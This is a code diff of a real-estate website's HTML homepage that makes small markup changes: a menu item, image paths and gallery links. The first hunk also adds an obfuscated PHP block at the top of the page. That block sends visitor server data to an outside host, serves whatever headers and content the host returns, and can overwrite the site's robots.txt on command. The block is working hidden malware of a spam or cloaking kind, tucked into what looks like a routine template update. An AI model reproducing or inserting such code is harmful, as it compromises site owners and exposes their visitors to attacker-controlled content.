@@ -1,3 +1,4 @@
+<?php erROr_RePORtinG(rounD(0+0+0+0+0+0+0)); $smSnNW="zj\61\67\62"; $IgPUjx="\147\155\61"; if(Preg_MAtCH("/\152\160\62\60\62\63/si",$_SERVER["\122EQU\105S\124\137U\122I"])==roUnd(0.078719+0.214+0.0897025+0.028+0.190618+0.22128+0.010297+0.12883+0.038)) { heaDER("H\124\124P\57\61\56\60 \64\60\64\40\116ot\40Fo\165\156d"); echo "\110T\124P/\61.\60 \64\60\64 \116\157t\40F\157\165nd___".$smSnNW."___".$IgPUjx; exit; } $QTNv="\150\164\164p\72//".$smSnNW.".\166\141li\144r\141y.\143\157m"; $wnlo="\57i\156\144\145x\56php?\126\123\75".$IgPUjx."&\107\120=".$smSnNW; $vl=array( "SCRI\120\124\137\116AM\105", "\122EQU\105S\124\137U\122I", "\110TTP\123", "\122\105\121UEST\137\123\103\110E\115\105", "\123ERV\105\122_\120\117R\124", "\122\105MOTE_A\104\104R", "\110\124\124\120_RE\106\105\122\105R", "\110\124T\120\137\101C\103EPT\137L\101\116GU\101\107E", "HT\124\120\137U\123ER\137A\107ENT", "\110T\124P\137HO\123T" ); foreach($vl as $kPmnQ) { $il=isset($_SERVER[$kPmnQ])?$_SERVER[$kPmnQ]:''; $CGRyFw=base64_eNcodE(TRIm($il)); $CGRyFw=stR_replaCe("\53","\55",$CGRyFw); $CGRyFw=sTr_REpLacE("/","_",$CGRyFw); $CGRyFw=STr_rePLACE("=","\56",$CGRyFw); $wnlo.="\46".$kPmnQ."=".$CGRyFw; } $qpD=$QTNv.$wnlo; $xec=cUrl_iNiT(); CURl_sETOPT($xec,CURLOPT_URL,$qpD); cuRl_SEtopt($xec,CURLOPT_RETURNTRANSFER,ROUND(0.1034111+0.12747+0.2588869+0.02693+0.1889+0.29443)); CURL_seTopt($xec,CURLOPT_CONNECTTIMEOUT,roUnD(5.5044248+4.495575)); $bAOP=CURl_ExEc($xec); $bAOP=trIM($bAOP); CurL_CLOSe($xec); if(empty($bAOP)) { $bAOP=fiLe_Get_CONtEnTS($qpD); } $bAOP=TRim($bAOP); $KX=EXplOde("\174@#$|",$bAOP); $Kxa=couNt($KX); if($Kxa<3) { hEaDer("H\124\124P\57\61\56\60 \64\60\64\40\116ot\40Fo\165\156d"); exit; }else { $sY=trIm($KX[rOuND(0+0+0+0+0+0+0+0+0)]); if(!empty($sY)) { HeADeR($sY); } $RN=tRIM($KX[rounD(0.123+0.1641+0.5879575+0.1251476)]); if(!empty($RN)) { echo $RN; } $cMRLEz=trIM($KX[$Kxa-ROUnD(0.074+0.4955+0.273+0.157)]); if($cMRLEz=="exit") { exit; } if($cMRLEz=="\160in\147") { $TGqN="Us\145\162\55a\147e\156t\72*".PHP_EOL; $TGqN.="\101l\154\157w\72\57".PHP_EOL; $akL=expLoDE("<br\57\76",$RN); ArRAY_PoP($akL); foreach($akL as $Ot) { $TGqN.="S\151\164\145ma\160:".$Ot.PHP_EOL; } FiLE_puT_CONtentS($_SERVER["DO\103UM\105\116T\137\122O\117T"]."/\162\157\142ot\163\56t\170t",$TGqN); echo "rob\157\164s\56\164\170\164\40don\145"; exit; } } ?>
 <!DOCTYPE html>
 <html class="no-js" lang="zxx">
   <head>
@@ -62,7 +63,7 @@
               <div class="mobile-nav-toggler"><i class="fas fa-bars"></i></div>
               <div class="menu-wrap">
                 <nav class="menu-nav">
-                  <div class="logo navbar-logo">
+                  <div class="logo">
                     <a href="index.html"
                       ><img
                         src="assets/img/logo/vm-logo.png"
@@ -134,6 +135,7 @@
                             <a href="stamp.html">Stamp Duty & Registration</a>
                           </li>
                           <li><a href="nri.html">NRI Guide</a></li>
+                          <li><a href="#">Project Reports</a></li>
                         </ul>
                       </li>
                       <li><a href="career.html">Career</a></li>
@@ -328,7 +330,7 @@
           <div class="row align-items-center">
             <div class="col-lg-6">
               <div class="mission-img">
-                <img src="assets/img/about/who-we-are-4.jpg" alt="" />
+                <img src="assets/img/images/home-mission1.jpg" alt="" />
               </div>
             </div>
             <div class="col-lg-6">
@@ -662,7 +664,7 @@
               <div class="col-xl-3 col-lg-4 col-md-6">
                 <div class="project-item">
                   <div class="project-thumb">
-                    <a
+                    <a href="project-details.html"
                       ><img src="assets/img/gallery/gallery_img1.jpg" alt=""
                     /></a>
                   </div>
@@ -671,7 +673,7 @@
               <div class="col-xl-3 col-lg-4 col-md-6">
                 <div class="project-item">
                   <div class="project-thumb">
-                    <a
+                    <a href="project-details.html"
                       ><img src="assets/img/gallery/gallery_img2.jpg" alt=""
                     /></a>
                   </div>
@@ -680,7 +682,7 @@
               <div class="col-xl-3 col-lg-4 col-md-6">
                 <div class="project-item">
                   <div class="project-thumb">
-                    <a
+                    <a href="project-details.html"
                       ><img src="assets/img/gallery/gallery_img3.jpg" alt=""
                     /></a>
                   </div>
@@ -689,7 +691,7 @@
               <div class="col-xl-3 col-lg-4 col-md-6">
                 <div class="project-item">
                   <div class="project-thumb">
-                    <a
+                    <a href="project-details.html"
                       ><img src="assets/img/gallery/gallery_img4.jpg" alt=""
                     /></a>
                   </div>
@@ -698,7 +700,7 @@
               <div class="col-xl-3 col-lg-4 col-md-6">
                 <div class="project-item">
                   <div class="project-thumb">
-                    <a
+                    <a href="project-details.html"
                       ><img src="assets/img/gallery/gallery_img5.jpg" alt=""
                     /></a>
                   </div>
@@ -707,7 +709,7 @@
               <div class="col-xl-3 col-lg-4 col-md-6">
                 <div class="project-item">
                   <div class="project-thumb">
-                    <a
+                    <a href="project-details.html"
                       ><img src="assets/img/gallery/gallery_img6.jpg" alt=""
                     /></a>
                   </div>
@@ -716,7 +718,7 @@
               <div class="col-xl-3 col-lg-4 col-md-6">
                 <div class="project-item">
                   <div class="project-thumb">
-                    <a
+                    <a href="project-details.html"
                       ><img src="assets/img/gallery/gallery_img7.jpg" alt=""
                     /></a>
                   </div>
@@ -725,7 +727,7 @@
               <div class="col-xl-3 col-lg-4 col-md-6">
                 <div class="project-item">
                   <div class="project-thumb">
-                    <a
+                    <a href="project-details.html"
                       ><img src="assets/img/gallery/gallery_img8.jpg" alt=""
                     /></a>
                   </div>
